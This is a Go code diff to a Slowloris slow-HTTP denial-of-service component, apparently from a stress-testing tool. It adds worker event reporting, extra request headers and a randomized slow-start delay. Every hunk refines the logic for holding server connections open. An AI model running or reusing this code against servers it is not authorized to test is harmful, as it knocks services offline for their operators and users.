@@ -37,6 +37,10 @@ type Slowloris struct {
 	randn randn
 }
 
+func (s *Slowloris) AfterApply() error {
+	return s.defaults()
+}
+
 func (s *Slowloris) defaults() error {
 	if err := s.Target.defaults(); err != nil {
 		return err
@@ -74,9 +78,15 @@ func (s *Slowloris) Run(ctx context.Context) error {
 	runWithWorker(
 		workerCtx,
 		s.Target.Connections,
-		func(ctx context.Context) {
-			// TODO: log error
-			_ = s.worker(ctx)
+		func(ctx context.Context, workerId int) {
+			workerEventHandler := wrapEventSettings(s.Target.EventHandler, WithEventWorkerId(workerId))
+
+			defer capturePanic(workerEventHandler)
+
+			err := s.worker(ctx, workerEventHandler)
+			if err != nil {
+				workerEventHandler.HandleEvent(NewEvent(EventWorkerError, WithEventError(err)))
+			}
 		},
 	)
 
@@ -107,20 +117,30 @@ func (s *Slowloris) initAttack(conn io.Writer) error {
 		return fmt.Errorf("write HTTP start line: %w", err)
 	}
 
+	if err := writeHTTPHeaderTo(conn, "Host", s.Target.Url.Host); err != nil {
+		return fmt.Errorf("write HTTP header: %w", err)
+	}
+
 	if err := writeHTTPHeaderTo(conn, "User-Agent", s.UserAgents[s.randn(len(s.UserAgents))]); err != nil {
+		return fmt.Errorf("write HTTP header: %w", err)
+	}
+
+	if err := writeHTTPHeaderTo(conn, "Accept", "*/*"); err != nil {
 		return fmt.Errorf("write HTTP header: %w", err)
 	}
 
 	return nil
 }
 
-func (s *Slowloris) worker(ctx context.Context) error {
+func (s *Slowloris) worker(ctx context.Context, eventHandler EventHandler) error {
 	conn, err := s.dial("tcp", s.Target.Url.Host)
 	if err != nil {
 		return fmt.Errorf("dial %q: %w", s.Target.Url.Host, err)
 	}
+	eventHandler.HandleEvent(NewEvent(EventTCPDial))
 	defer func() {
 		_ = conn.Close()
+		eventHandler.HandleEvent(NewEvent(EventTCPClosed))
 	}()
 
 	if err := s.setupTCPConnIfNeeded(conn); err != nil {
@@ -139,6 +159,9 @@ func (s *Slowloris) worker(ctx context.Context) error {
 	gibberishInterval := s.GibberishInterval / time.Millisecond
 	var gibberishTimer *time.Timer
 	setGibberishTimer := func() <-chan time.Time {
+		// TODO: if no headers are being sent, the client side will not be able to detect
+		// if the connection is still alive. In this case, existing workers will be in parked state instead of error out.
+		// ref: https://github.com/golang/go/issues/15735
 		if !s.SendGibberish {
 			return nil
 		}
@@ -147,7 +170,11 @@ func (s *Slowloris) worker(ctx context.Context) error {
 		if gibberishTimer != nil {
 			gibberishTimer.Reset(nextInterval)
 		} else {
-			gibberishTimer = time.NewTimer(nextInterval)
+			// slow start 50 ~ 100ms to make sure slow http server like python -mhttp.server
+			// can handle it
+			slowStartInterval := time.Duration(s.randn(50)+50) * time.Millisecond
+			interval := nextInterval + slowStartInterval
+			gibberishTimer = time.NewTimer(interval)
 		}
 
 		return gibberishTimer.C
